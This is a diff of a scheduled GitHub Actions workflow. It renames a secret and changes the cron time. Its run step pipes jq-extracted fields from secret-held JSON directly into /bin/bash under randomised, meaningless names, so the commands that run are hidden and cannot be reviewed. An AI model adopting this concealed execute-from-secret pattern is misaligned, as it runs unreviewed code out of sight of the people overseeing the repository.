@@ -1,24 +1,26 @@
 name: wurenwenfeng
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 5/6 * * *'
+    - cron: '44 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wurenwenfeng
         env:
-          fca75147: ${{ secrets.fca75147 }}
+          z7364: ${{ secrets.z7364 }}
         run: |
-          echo $fca75147 | jq -r .pk4 | /bin/bash
-          echo $f79613 | jq -r .aa78615 | /bin/bash
-          echo $our0816 | jq -r .zel9706 | /bin/bash
-          echo $qiak89925 | jq -r .pvgo2 | /bin/bash
-          echo $jiaxo341 | jq -r .lnca61 | /bin/bash
-          echo $sb87 | jq -r .d5594 | /bin/bash
-          echo $z5639 | jq -r .ls1 | /bin/bash
-          echo $ir351 | jq -r .hi23448 | /bin/bash
+          echo $z7364 | jq -r .jq486 | /bin/bash
+          echo $keqm3832 | jq -r .bpfhy7012 | /bin/bash
+          echo $unkfm4 | jq -r .r48 | /bin/bash
+          echo $sfuxy6 | jq -r .omoh70 | /bin/bash
+          echo $betzm8702 | jq -r .fmb44 | /bin/bash
+          echo $kcip01852 | jq -r .njp3 | /bin/bash
+          echo $qvl08715 | jq -r .wn944 | /bin/bash
+          echo $yj84 | jq -r .u09 | /bin/bash
+          echo $z521 | jq -r .yjhsm647 | /bin/bash
 
